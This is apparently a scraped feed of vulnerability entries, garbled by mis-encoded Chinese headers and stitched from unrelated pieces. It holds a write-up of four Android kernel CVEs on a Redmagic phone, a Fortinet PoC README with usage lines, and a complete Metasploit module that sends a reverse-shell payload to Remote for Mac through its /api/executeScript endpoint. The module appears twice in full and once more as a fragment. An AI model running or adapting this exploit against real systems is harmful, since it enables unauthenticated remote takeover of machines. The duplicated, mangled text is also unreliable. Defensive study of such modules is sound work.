execution.Risk:This flaw can be weaponized to escalate privileges from an unprivileged context to full root, bypassing standard sandboxing mechanisms.2. CVE-2025-21830 â€” Race Condition in Binder DriverType: Race ConditionComponent: Android Binder IPC driverAttack Vector: LocalSeverity: CriticalDescription:A timing flaw in the binder transaction handling logic allows a malicious process to race internal reference counting mechanisms. By carefully synchronizing multiple binder calls, an attacker can achieve a use-after-free or double-free, leading to arbitrary memory manipulation in the kernel space.Risk:This vulnerability enables local privilege escalation (LPE) and can be used as a core part of a full Android jailbreak chain.3. CVE-2025-21829 â€” Improper Bounds Checking in GPU Driver (Adreno)Type: Buffer Overflow / Out-of-Bounds AccessComponent: Qualcomm Adreno GPU driver (proprietary)Attack Vector: Local (via GPU memory sharing)Severity: HighDescription:Insufficient bounds checking in the Adreno GPU memory management code allows user space processes to issue malformed commands or memory mappings that lead to out-of-bounds writes. The attacker can then overwrite kernel structures associated with GPU context switching or memory handling.Risk:This vulnerability is particularly dangerous on gaming phones like the Redmagic series, where GPU access is frequently exposed to user apps for performance tuning. It can lead to privilege escalation and persistent rootkits.4. CVE-2025-21826 â€” Faulty Permission Enforcement in PMIC SubsystemType: Improper Access ControlComponent: Power Management IC (PMIC) interface driverAttack Vector: LocalSeverity: Mediumâ€“HighDescription:A security flaw in the interface between the Android HAL and the PMIC firmware allows unauthorized access to low-level power and thermal controls. A malicious application with minimal privileges can directly communicate with the power controller, leading to system instability or hardware manipulation.Risk:While not directly leading to code execution, this flaw can be used to destabilize the system, bypass thermal throttling, or overclock hardware components, potentially damaging the device.Affected System StatusDespite having the March 1, 2025 Android security patch and the April 1, 2025 Google Play security update, the above vulnerabilities remain active and reproducible on the Redmagic 9s pro (NX769J). This indicates that: Either vendor-specific patches were not backported properly by Nubia/Redmagic. Or, custom kernel drivers and proprietary blobs (especially GPU and PMIC interfaces) have not been patched according to AOSP upstream.Potential Exploitation and ImpactA skilled attacker, or a malicious app embedded with native code execution capabilities, could exploit one or more of these CVEs to: Gain root access (privilege escalation). Bypass SELinux enforcement and app sandboxing. Install persistent malware (rootkits). Access or exfiltrate private data (photos, credentials, messages). Disable or damage hardware components via PMIC exploits.In combination, these vulnerabilities pose a severe risk to device integrity, confidentiality, and user safety.Recommendations Immediate Action for Users: Avoid installing APKs from untrusted sources. Refrain from granting root access or debugging privileges to any apps. Monitor system behavior for anomalies (e.g., overheating, unexpected reboots). Vendor Action: Nubia/Redmagic must release firmware and kernel patches addressing these CVEs. Kernel modules (GPU, ION, PMIC) should be recompiled against updated security policies and upstream kernel patches. Security Research Implication: These vulnerabilities should be further monitored in the wild for exploitation. Responsible disclosure channels should be used to notify the OEM and Google.ConclusionThe presence of CVE-2025-21832, CVE-2025-21830, CVE-2025-21829, and CVE-2025-21826 on the Redmagic 9s pro device indicates that despite relatively recent Android security updates, significant kernel-level vulnerabilities remain exploitable. This highlights a persistent gap between Google's AOSP patching and OEM-level firmware security practices. Users and vendors must act quickly to prevent real-world exploitation. 123456- CVEs- LICENSE- README.md

posts.title: Remote for Mac æœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´
posts.text: æ¼æ´åç§°ï¼š Remote for Mac æœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ æ¼æ´ç±»å‹ï¼š æœªæˆæƒè®¿é—® æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š è¯¥æ¨¡å—åˆ©ç”¨äº†Remote for Macç‰ˆæœ¬2025.7åŠä¹‹å‰ç‰ˆæœ¬ä¸­çš„/api/executeScriptç«¯ç‚¹çš„æœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚å½“ç›®æ ‡ç³»ç»Ÿä¸Šç¦ç”¨èº«ä»½éªŒè¯æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„AppleScriptå‘½ä»¤ï¼ŒåŒ…æ‹¬é€šè¿‡do shell scriptæ‰§è¡Œçš„shellå‘½ä»¤ã€‚æ‰€æœ‰ç‰ˆæœ¬ç›´è‡³2025.7ï¼ˆåŒ…æ‹¬è¡¥ä¸ç‰ˆæœ¬ï¼‰å‡æ˜“å—æ”»å‡»ã€‚ äº§å“åç§°ï¼š Remote for Mac å½±å“ç‰ˆæœ¬ï¼š version <= 2025.7 æ¥æºï¼š https://github.com/rapid7/metasploit-framework/blob/f20e72b6c8b2f3fd5b628f6bdeb0cfdfd7c8350c/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb ç±»å‹ï¼š rapid7/metasploit-framework:github commit 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109require 'json'class MetasploitModule < Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpClient prepend Msf::Exploit::Remote::AutoCheck def initialize(info = {}) super( update_info( info, 'Name' => 'Remote for Mac Unauthenticated RCE', 'Description' => %q{ This module exploits an unauthenticated remote code execution vulnerability in Remote for Mac versions up to and including 2025.7 via the /api/executeScript endpoint. When authentication is disabled on the target system, it allows attackers to execute arbitrary AppleScript commands, which can include shell commands via `do shell script`. All versions up to 2025.7 (including patch versions) are vulnerable. }, 'License' => MSF_LICENSE, 'Author' => ['Chokri Hammedi (@blue0x1)'], 'References' => [ ['PACKETSTORM', '195347'] ], 'DisclosureDate' => '2025-05-27', 'Platform' => ['unix', 'osx'], 'Arch' => ARCH_CMD, 'Targets' => [['Auto', {}]], 'DefaultTarget' => 0, 'DefaultOptions' => { 'SSL' => true }, 'Notes' => { 'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS] } ) ) end def check res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'api', 'getVersion'), 'method' => 'GET' ) return CheckCode::Unknown('No response from target') unless res&.code == 200 info = res.get_json_document if info.empty? return CheckCode::Unknown('Unable to parse JSON from /api/getVersion') end if info['requires.auth'] == true return CheckCode::Safe('Target requires authentication on /api/executeScript') end version = info['version'].to_s if version.empty? return CheckCode::Unknown('Could not determine target version') end target_version = Rex::Version.new(version) vulnerable_version = Rex::Version.new('2025.7') if target_version <= vulnerable_version return CheckCode::Appears else return CheckCode::Safe("Target version #{version} is not vulnerable") end end def exploit print_status("Generating reverse shell payload for #{datastore['LHOST']}:#{datastore['LPORT']}") cmd = payload.encoded applescript = %(do shell script "#{cmd}") host_name = Rex::Text.rand_text_alpha(8) host_model = "#{Rex::Text.rand_text_alpha(4)}#{rand(99)}" script_name = Rex::Text.rand_text_alpha(8) print_status("Sending exploit to #{rhost}:#{rport} via AppleScript") res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'api', 'executeScript'), 'method' => 'GET', 'headers' => { 'X-ClientToken' => Rex::Text.rand_text_numeric(4), 'X-HostName' => host_name, 'X-HostFullModel' => host_model, 'X-Script' => applescript, 'X-ScriptName' => script_name, 'X-ScriptDelay' => '0' } ) print_status('Payload sent') if res&.code == 200 print_good('Payload delivered successfully. Awaiting session...') res_json = res.get_json_document print_status("Received response: #{res_json['result']}") end endend

posts.text: æ¼æ´åç§°ï¼š Remote for Mac æœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ æ¼æ´ç±»å‹ï¼š æœªæˆæƒè®¿é—® æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š æ­¤æ¨¡å—åˆ©ç”¨äº†Remote for Macç‰ˆæœ¬2025.7åŠä¹‹å‰ç‰ˆæœ¬ä¸­çš„æœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œé€šè¿‡/api/executeScriptç«¯ç‚¹ã€‚å½“ç›®æ ‡ç³»ç»Ÿä¸Šç¦ç”¨èº«ä»½éªŒè¯æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„AppleScriptå‘½ä»¤ï¼ŒåŒ…æ‹¬é€šè¿‡do shell scriptæ‰§è¡Œçš„shellå‘½ä»¤ã€‚æ‰€æœ‰ç‰ˆæœ¬ç›´è‡³2025.7ï¼ˆåŒ…æ‹¬è¡¥ä¸ç‰ˆæœ¬ï¼‰å‡æ˜“å—æ”»å‡»ã€‚ äº§å“åç§°ï¼š Remote for Mac å½±å“ç‰ˆæœ¬ï¼š version <= 2025.7 æ¥æºï¼š https://github.com/rapid7/metasploit-framework/blob/6105b99465722c8f16c13c20d3910dbb35d24f0f/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb ç±»å‹ï¼š rapid7/metasploit-framework:github issues 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109require 'json'class MetasploitModule < Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpClient prepend Msf::Exploit::Remote::AutoCheck def initialize(info = {}) super( update_info( info, 'Name' => 'Remote for Mac Unauthenticated RCE', 'Description' => %q{ This module exploits an unauthenticated remote code execution vulnerability in Remote for Mac versions up to and including 2025.7 via the /api/executeScript endpoint. When authentication is disabled on the target system, it allows attackers to execute arbitrary AppleScript commands, which can include shell commands via `do shell script`. All versions up to 2025.7 (including patch versions) are vulnerable. }, 'License' => MSF_LICENSE, 'Author' => ['Chokri Hammedi (@blue0x1)'], 'References' => [ ['PACKETSTORM', '195347'] ], 'DisclosureDate' => '2025-05-27', 'Platform' => ['unix', 'osx'], 'Arch' => ARCH_CMD, 'Targets' => [['Auto', {}]], 'DefaultTarget' => 0, 'DefaultOptions' => { 'SSL' => true }, 'Notes' => { 'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS] } ) ) end def check res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'api', 'getVersion'), 'method' => 'GET' ) return CheckCode::Unknown('No response from target') unless res&.code == 200 info = res.get_json_document if info.empty? return CheckCode::Unknown('Unable to parse JSON from /api/getVersion') end if info['requires.auth'] == true return CheckCode::Safe('Target requires authentication on /api/executeScript') end version = info['version'].to_s if version.empty? return CheckCode::Unknown('Could not determine target version') end target_version = Rex::Version.new(version) vulnerable_version = Rex::Version.new('2025.7') if target_version <= vulnerable_version return CheckCode::Appears else return CheckCode::Safe("Target version #{version} is not vulnerable") end end def exploit print_status("Generating reverse shell payload for #{datastore['LHOST']}:#{datastore['LPORT']}") cmd = payload.encoded applescript = %(do shell script "#{cmd}") host_name = Rex::Text.rand_text_alpha(8) host_model = "#{Rex::Text.rand_text_alpha(4)}#{rand(99)}" script_name = Rex::Text.rand_text_alpha(8) print_status("Sending exploit to #{rhost}:#{rport} via AppleScript") res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'api', 'executeScript'), 'method' => 'GET', 'headers' => { 'X-ClientToken' => Rex::Text.rand_text_numeric(4), 'X-HostName' => host_name, 'X-HostFullModel' => host_model, 'X-Script' => applescript, 'X-ScriptName' => script_name, 'X-ScriptDelay' => '0' } ) print_status('Payload sent') if res&.code == 200 print_good('Payload delivered successfully. Awaiting session...') res_json = res.get_json_document print_status("Received response: #{res_json['result']}") end endend

FortiRecorder: 7.2.0 through 7.2.3, 7.0.0 through 7.0.5, 6.4.0 through 6.4.5; FortiMail: 7.6.0 through 7.6.2, 7.4.0 through 7.4.4, 7.2.0 through 7.2.7, 7.0.0 through 7.0.8; FortiNDR: 7.6.0, 7.4.0 through 7.4.7, 7.2.0 through 7.2.4, 7.0.0 through 7.0.6; FortiCamera: 2.1.0 through 2.1.3, 2.0 all versions, 1.1 all versions æ¥æºï¼š https://github.com/B1ack4sh/Blackash-CVE-2025-32756 ç±»å‹ï¼š CVE-2025:github search 1234567891011121314151617181920212223242526272829303132333435363738394041424344# Blackash-CVE-2025-32756# CVE-2025-32756 'Fortinet' RCE PoC â€¼ï¸# Description:A stack-based buffer overflow vulnerability [CWE-121] in Fortinet FortiVoice versions \`7.2.0\`, \`7.0.0\` through \`7.0.6\`, \`6.4.0\` through \`6.4.10\`, FortiRecorder versions \`7.2.0\` through \`7.2.3\`, \`7.0.0\` through \`7.0.5\`, \`6.4.0\` through \`6.4.5\`, FortiMail versions \`7.6.0\` through \`7.6.2\`, \`7.4.0\` through \`7.4.4\`, \`7.2.0\` through \`7.2.7\`, \`7.0.0\` through \`7.0.8\`, FortiNDR versions \`7.6.0\`, \`7.4.0\` through \`7.4.7\`, \`7.2.0\` through \`7.2.4\`, \`7.0.0\` through \`7.0.6\`, FortiCamera versions \`2.1.0\` through \`2.1.3\`, 2.0 all versions, 1.1 all versions, allows a remote unauthenticated attacker to execute arbitrary code or commands via sending HTTP requests with specially crafted hash cookie.# Metrics:CVSS 3.x Severity and Vector Strings:CNA: \`Fortinet\`, Inc. 'Base Score': 9.8 CRITICAL \`âš«\` Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:HThe vulnerability exists in the processing of the enc parameter in the /remote/hostcheck_validate endpoint, where improper bounds checking allows buffer overflow.# Usage:\`\`\`python3 fortinet_cve_2025_32756_poc.py target_ip [-p port] [-d]\`\`\`# Arguments:+ \`target_ip\`: Target Fortinet device+ \`-p, --port\`: Target port (default: 443)+ \`-d, --debug\`: Enable debug output# Mitigation:Update to patched versions:+ \`FortiVoice\`: 7.2.1+, 7.0.7+, 6.4.11++ \`FortiMail\`: 7.6.3+, 7.4.5+, 7.2.8+, 7.0.9++ \`FortiNDR\`: 7.6.1+, 7.4.8+, 7.2.5+, 7.0.7++ \`FortiRecorder\`: 7.2.4+, 7.0.6+, 6.4.6++ \`FortiCamera\`: 2.1.4+# Disclaimer âš ï¸For educational and research purposes only. Use only against systems you own or have permission to test. 1234- README.md

return CheckCode::Unknown('Could not determine target version') end target_version = Rex::Version.new(version) vulnerable_version = Rex::Version.new('2025.7') if target_version <= vulnerable_version return CheckCode::Appears else return CheckCode::Safe("Target version #{version} is not vulnerable") end end def exploit print_status("Generating reverse shell payload for #{datastore['LHOST']}:#{datastore['LPORT']}") cmd = payload.encoded applescript = %(do shell script "#{cmd}") host_name = Rex::Text.rand_text_alpha(8) host_model = "#{Rex::Text.rand_text_alpha(4)}#{rand(99)}" script_name = Rex::Text.rand_text_alpha(8) print_status("Sending exploit to #{rhost}:#{rport} via AppleScript") res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'api', 'executeScript'), 'method' => 'GET', 'headers' => { 'X-ClientToken' => Rex::Text.rand_text_numeric(4), 'X-HostName' => host_name, 'X-HostFullModel' => host_model, 'X-Script' => applescript, 'X-ScriptName' => script_name, 'X-ScriptDelay' => '0' } ) if res&.code == 200 print_good('Payload delivered successfully. Awaiting session...') else fail_with(Failure::UnexpectedReply, "Unexpected HTTP response: #{res&.code || 'no response' }") end endend
